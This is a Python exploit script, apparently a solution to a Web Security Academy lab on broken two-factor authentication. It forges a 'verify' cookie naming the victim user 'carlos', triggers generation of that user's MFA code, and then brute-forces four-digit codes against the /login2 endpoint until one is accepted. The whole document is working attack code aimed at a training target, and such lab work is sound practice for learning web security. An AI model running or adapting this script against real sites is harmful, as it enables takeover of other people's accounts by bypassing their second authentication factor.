import requests

url = "https://0ae100730468444180a244e100c3002b.web-security-academy.net/login2"

username = "carlos"

cookies = {
    "verify" : f"carlos"
}

# GETting the /login2 page is done after the first login, and thus generates the code for the user
# GET the /login2 page using the carlos username parameter so a 2FA code is generated

requests.get(url, cookies=cookies)

for i in range(1000, 10000):
    data = {
        "mfa-code" : str(i)
    }

    response = requests.post(url, data=data, cookies=cookies)
    if(not b"Incorrect" in response.content):
        print(f"Correct code : {data}")
        break